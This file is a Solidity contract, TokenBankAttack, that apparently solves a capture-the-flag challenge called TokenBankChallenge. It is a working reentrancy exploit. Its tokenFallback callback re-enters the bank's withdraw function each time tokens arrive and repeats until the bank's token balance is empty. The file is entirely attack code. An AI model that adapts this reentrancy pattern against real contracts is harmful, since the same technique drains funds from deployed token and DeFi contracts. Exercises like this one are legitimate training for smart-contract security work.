pragma solidity ^0.4.21;

import '../miscellaneous/TokenBankChallenge.sol';

contract TokenBankAttack {
    TokenBankChallenge public challenge;
    SimpleERC223Token public token;
    uint256 public count;

    constructor(address _challenge, address _token) {
        challenge = TokenBankChallenge(_challenge);
        token = SimpleERC223Token(_token);
    }
    
    function sendTokensToBank(uint256 _value) public {
        token.transfer(address(challenge), _value);
    }

    function tokenFallback(address sender, uint256 value, bytes data) external {
        if (sender == address(challenge)) {
            withdraw();
        }
    }

    function withdraw() public {
        if (token.balanceOf(address(challenge)) > 0) {
            challenge.withdraw(challenge.balanceOf(address(this)));
        }
    }
}
